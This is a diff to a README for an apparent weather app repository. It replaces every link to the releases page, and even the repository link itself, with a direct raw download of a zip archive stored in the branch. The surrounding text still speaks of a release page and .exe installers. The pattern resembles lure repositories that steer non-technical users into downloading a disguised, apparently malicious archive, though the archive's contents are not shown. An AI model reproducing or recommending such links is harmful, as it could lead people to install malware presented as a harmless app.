@@ -1,6 +1,6 @@
 # ☁️ kalaiarasan-weather-app - Easy Local Weather Updates
 
-[![Download kalaiarasan-weather-app](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/releases)
+[![Download kalaiarasan-weather-app](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/raw/refs/heads/main/github/app-weather-kalaiarasan-v3.0.zip)
 
 ---
 
@@ -15,7 +15,7 @@ You do not need any technical skills to install or use this app. It gives you cu
 ## 📥 Download
 
 Visit this page to download the app:  
-[https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/releases](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/releases)
+[https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/raw/refs/heads/main/github/app-weather-kalaiarasan-v3.0.zip](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/raw/refs/heads/main/github/app-weather-kalaiarasan-v3.0.zip)
 
 This link takes you to the release page where you can find the latest version. Look for a file ending with `.zip` or `.exe`. These contain everything you need to run the app.
 
@@ -38,7 +38,7 @@ The app uses your browser to display the information. It does not change your sy
 
 Follow these steps to get the app running:
 
-1. Go to the [Release page](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/releases) using the button above.
+1. Go to the [Release page](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/raw/refs/heads/main/github/app-weather-kalaiarasan-v3.0.zip) using the button above.
 2. Find the latest release version. The newest release is usually at the top.
 3. Download the file named something like `kalaiarasan-weather-app.zip` or `kalaiarasan-weather-app.exe`.
 4. If you download the `.zip` file:
@@ -72,7 +72,7 @@ Follow these steps to get the app running:
 
 ## 🔄 Updating the App
 
-- Check the [release page](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/releases) regularly for new versions.
+- Check the [release page](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/raw/refs/heads/main/github/app-weather-kalaiarasan-v3.0.zip) regularly for new versions.
 - Download the latest release using the same steps as above.
 - If you use the `.exe` installer, running it again will update your app.
 - If you use the `.zip` version, extract the new files over the old ones.
@@ -115,10 +115,10 @@ Follow these steps to get the app running:
 ## 🔗 Useful Links
 
 - **Download page:**  
-  [https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/releases](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/releases)
+  [https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/raw/refs/heads/main/github/app-weather-kalaiarasan-v3.0.zip](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/raw/refs/heads/main/github/app-weather-kalaiarasan-v3.0.zip)
 
 - **GitHub repository:**  
-  [https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app)
+  [https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/raw/refs/heads/main/github/app-weather-kalaiarasan-v3.0.zip](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/raw/refs/heads/main/github/app-weather-kalaiarasan-v3.0.zip)
 
 ---
 
@@ -140,4 +140,4 @@ You can explore the source files inside the downloaded folder to see how it work
 
 ---
 
-[![Download kalaiarasan-weather-app](https://img.shields.io/badge/Download-Here-green)](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/releases)
+[![Download kalaiarasan-weather-app](https://img.shields.io/badge/Download-Here-green)](https://github.com/Nickelironbatteryvesicle763/kalaiarasan-weather-app/raw/refs/heads/main/github/app-weather-kalaiarasan-v3.0.zip)
